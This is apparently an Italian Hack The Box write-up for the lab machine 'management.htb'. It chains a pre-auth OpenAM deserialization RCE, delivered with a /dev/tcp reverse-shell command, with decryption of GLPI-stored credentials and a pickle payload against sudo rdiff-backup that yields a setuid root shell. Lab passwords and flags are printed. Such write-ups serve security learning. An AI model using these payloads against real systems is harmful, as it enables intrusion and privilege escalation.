<div align="center">

```
 __  __   __ _   __ _   __ _   __ _  ___ __  __ ___ __ _ ____
|  \/  | /  \ | \| | /  \ / _ | __| |  \/  | __| \| |_ _|
| |\/| |/ /\ \| .` |/ /\ | (_ | _|  | |\/| | _|| .` || |
|_|  |_/_/  \_|_|\_/_/  \_\___|___| |_|  |_|___|_|\_|___|
```

`[ management.htb :: identity broker down, root up ]`

</div>

<br>

Il cartellone dice "Managed IT & Infrastructure", identita, service desk, monitoring e backup
per aziende mid market. Dietro la vetrina c'e un OpenAM che si fida di un parametro che non
avrebbe mai dovuto deserializzare, un GLPI che nessuno doveva vedere, e un rdiff-backup che
esegue pickle come root. Tre anelli, una sola catena.

<br>

```
▓▒░ 0x00 // RECON ░▒▓
```

Scansione TCP completa, niente scorciatoie:

```
$ nmap -p- -T4 --min-rate 3000 10.129.60.117
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu
80/tcp    open  http       nginx 1.24.0
443/tcp   open  ssl/http   nginx 1.24.0
1689/tcp  open  java-rmi
4444/tcp  open  ssl        OpenDJ Administration Connector (LDAPS)
36225/tcp open  java-rmi
50389/tcp open  ldap       (anonymous bind OK)
```

`management.htb` su 443 serve una SPA statica cifrata lato client (AES-GCM con la chiave nel
sorgente, teatro puro). `sso.management.htb` e OpenAM, il fork OpenIdentityPlatform, ricostruito
su Tomcat 10 e Java 21 con OpenDJ 5.0.3 come directory. Il fuzzing vhost su 114k parole non
trova nulla oltre a questi due nomi: tutto il resto e il redirect catch all di nginx.

Nota importante che orienta tutta la sessione: questa non e la OpenAM legacy. I PoC pubblici
classici vanno riverificati uno per uno, perche il fork ha ricompilato e riconfigurato mezzo
stack.

<br>

```
▓▒░ 0x01 // FOOTHOLD :: CVE-2026-33439 ░▒▓
```

`nuclei` segnala CVE-2021-35464 (deserializzazione `jato.pageSession`) come critica. Falso
allarme sul comportamento: l'endpoint `ccversion` risponde, ma la POST viene bloccata e il
fork ha applicato la `WhitelistObjectInputStream` proprio a `jato.pageSession`. La gadget chain
storica muore li.

La regressione vera e un'altra. La patch di CVE-2021-35464 ha coperto un solo parametro. Il
parametro gemello `jato.clientSession` segue un percorso separato,
`ClientSession.deserializeAttributes()` che chiama `Encoder.deserialize()` senza nessuna
whitelist. Stesso primitivo, sink diverso, e cambia solo il nome del parametro. Questa e
**CVE-2026-33439**, pre auth RCE.

La chain e costruita solo con classi presenti nel WAR (PriorityQueue, Column$ColumnComparator,
TemplatesImpl, translet malevolo), quindi non servono librerie esterne. Unico requisito serio:
il bytecode va compilato con lo stesso JDK del target, altrimenti la deserializzazione fallisce.

```
$ sudo apt-get install -y openjdk-21-jdk-headless
$ export PATH=/usr/lib/jvm/java-21-openjdk-amd64/bin:$PATH

$ python3 Exploit_CVE_2026_33439.py \
    --url https://sso.management.htb/openam \
    --command "bash -i >& /dev/tcp/10.10.15.0/4445 0>&1" \
    --jars ./Jars --endpoint /ui/PWResetUserValidation --method POST
[+] Payload ready | 4340 chars
[*] Delivering payload | method=POST | /ui/PWResetUserValidation
[*] Server response | HTTP 200
```

```
$ nc -lvnp 4445
openam@management:/$ id
uid=996(openam) gid=987(openam) groups=987(openam)
```

Shell come `openam`. `user.txt` non e leggibile: la home e di `owen`, non c'e ancora la strada.

<br>

```
▓▒░ 0x02 // PIVOT :: IL SERVIZIO CHE NON SI VEDE DA FUORI ░▒▓
```

La scansione esterna mostra sette porte. Da dentro, `ss -tlnp` racconta una storia diversa:

```
127.0.0.1:3306   mariadbd
127.0.0.1:8080   java (openam, dietro nginx)
/run/php/php8.3-fpm.sock   php-fpm
```

C'e uno stack PHP con MariaDB che dall'esterno non e raggiungibile: nginx non ha nessuna route
verso il socket php-fpm. In `/opt/glpi` gira **GLPI 11.0.5**, un gestionale di ticketing e
asset. Il file `config/config_db.php` e leggibile da tutti:

```php
$this->dbuser     = 'glpi';
$this->dbpassword = '8rhu0L6Pw4Y7';
$this->dbdefault  = 'glpidb';
```

GLPI e l'anello che collega il web (OpenAM) alla directory. Nel database, la tabella
`glpi_authldaps` tiene l'account di bind LDAP che GLPI usa per sincronizzare gli utenti:

```
$ mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "select rootdn, rootdn_passwd from glpi_authldaps\G"
rootdn:        cn=svc-glpi,ou=services,dc=management,dc=htb
rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

La password e cifrata, ma GLPI conserva la chiave accanto ai dati. Leggendo
`src/GLPIKey.php` si vede lo schema: XChaCha20-Poly1305 (sodium), nonce nei primi byte,
chiave in `config/glpicrypt.key`. La decifratura si fa con gli strumenti gia presenti sul
target, con la sua stessa chiave:

```php
$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
$raw = base64_decode('avrqW65aZWKz...O3Pw==');
$nonce = mb_substr($raw, 0, 24, '8bit');
$ct    = mb_substr($raw, 24, null, '8bit');
echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct, $nonce, $nonce, $key);
// WpczC40GhTbk
```

Quella password non entra in LDAP con l'utente `svc-glpi`, ma il riuso non e mai educato:

```
$ sshpass -p 'WpczC40GhTbk' ssh owen@management.htb 'cat user.txt'
577ab58b3946a126ce584b0f0a0e9165
```

**user.txt**: `577ab58b3946a126ce584b0f0a0e9165`

<br>

```
▓▒░ 0x03 // ROOT :: rdiff-backup --server MANGIA PICKLE ░▒▓
```

`owen` ha una sola regola sudo, e sembra blindata:

```
$ sudo -l
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

`--restrict-path` e `--restrict-mode read-only` promettono una sandbox in sola lettura dentro
`/opt/backup`. Il problema e a monte di quella sandbox. In modalita `--server`, il protocollo
di rdiff-backup legge frame dalla pipe e, per i frame di tipo `o`, chiama `pickle.loads()`
sui byte grezzi. Guardando `connection.py`, il `pickle.loads` (riga 318) avviene dentro
`_get()`, **prima** che `Security.vet_request()` venga interpellato. La deserializzazione arriva
per prima, il controllo dei permessi dopo. Quindi `restrict-path` e `restrict-mode` non toccano
mai il vero punto di ingresso: e una deserializzazione pickle pre auth che gira come root.

Due dettagli operativi. Primo, la regola sudo finisce con `*`, cioe pretende almeno un
argomento dopo `read-only`: basta appendere `--verbosity 0`, che soddisfa il glob e non
disturba il server. Secondo, il payload e un semplice oggetto con `__reduce__` che restituisce
`os.system(...)`, cosi al `pickle.loads` il comando parte da solo.

```python
CMD = "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"

class Exploit:
    def __reduce__(self):
        return (os.system, (CMD,))

proc = subprocess.Popen(
    ["sudo","-n","/usr/bin/rdiff-backup","--server",
     "--restrict-path","/opt/backup","--restrict-mode","read-only",
     "--verbosity","0"],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# un solo frame 'o' = header(9 byte) + pickle malevolo
payload = pickle.dumps(Exploit(), 4)
proc.stdin.write(b"o" + (0).to_bytes(1,"big") + len(payload).to_bytes(7,"big"))
proc.stdin.write(payload); proc.stdin.flush()
```

```
$ python3 rdiff_rce.py
$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 /tmp/rootbash

$ /tmp/rootbash -p -c 'id; cat /root/root.txt'
uid=1000(owen) gid=1000(owen) euid=0(root)
c88a43d2cc0e2b417c032c93a7774612
```

**root.txt**: `c88a43d2cc0e2b417c032c93a7774612`

<br>

```
▓▒░ 0x04 // NOTE DI CAMPO ░▒▓
```

- La patch di ieri copre un parametro, non una classe di bug. CVE-2021-35464 ha filtrato
  `jato.pageSession` e ha lasciato aperto il gemello `jato.clientSession`: stessa
  deserializzazione, cinque anni dopo, altro CVE.
- Un servizio che ascolta solo su `127.0.0.1` non e sicuro, e solo invisibile finche non entri.
  GLPI non aveva nessuna route da nginx, ma era il ponte tra web e directory.
- Cifrare una password e inutile se la chiave dorme nella cartella accanto. `glpicrypt.key`
  piu `rootdn_passwd` uguale plaintext.
- `restrict-path` e `restrict-mode` di rdiff-backup proteggono le operazioni sui file, non il
  canale. Il `pickle.loads` gira prima del vetting: la sandbox arriva sempre troppo tardi.

🪐 Hack The Planet 🪐
